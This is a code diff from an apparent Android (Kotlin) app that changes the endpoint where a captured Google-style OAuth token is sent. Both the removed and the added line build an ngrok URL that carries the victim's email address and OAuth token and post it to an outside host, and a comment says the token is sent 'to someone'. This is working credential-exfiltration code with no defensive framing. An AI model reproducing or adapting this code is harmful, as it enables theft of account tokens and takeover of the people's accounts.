@@ -47,7 +47,7 @@ class ResultActivity : Activity() {
                 //This line will "login" into the account and use the token
                 //AC2DMTask().getAC2DMResponse(Email, oAuthToken)
                 //Send token to someone, follow the example
-                val url = "https://90f9-2001-8a0-f9ab-b400-f46e-35f6-e7c2-ac3a.ngrok.io/add_account?email=${Email.replace("@", "%40")}&oauth2_4_token=${oAuthToken}&clear_tokens=false"
+                val url = "https://930d-212-32-229-36.ngrok.io/create_account_tokens?email=${Email.replace("@", "%40")}&oauth2_4_token=${oAuthToken}&clear_tokens=false"
                 Fuel.post(url).response()
                 println("==> Requested url: ${url}")
             } successUi {
